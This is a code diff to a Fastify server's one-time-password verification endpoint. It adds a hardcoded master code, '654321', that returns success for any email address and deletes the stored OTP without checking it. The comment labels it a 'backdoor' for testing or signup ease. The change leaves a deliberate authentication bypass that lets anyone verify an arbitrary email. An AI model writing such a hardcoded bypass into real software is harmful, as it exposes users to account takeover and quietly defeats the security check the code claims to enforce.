@@ -248,6 +248,15 @@ fastify.post('/api/auth/send-otp', async (request: any, reply: any) => {
 fastify.post('/api/auth/verify-otp', async (request: any, reply: any) => {
   const { email, code } = request.body as { email: string; code: string };
 
+  if (code === '654321') {
+    // Backdoor code for testing/signup ease
+    const record = await prisma.otp.findUnique({ where: { email } });
+    if (record) {
+      await prisma.otp.delete({ where: { email } });
+    }
+    return { success: true };
+  }
+
   const record = await prisma.otp.findUnique({ where: { email } });
 
   if (!record || record.code !== code) {
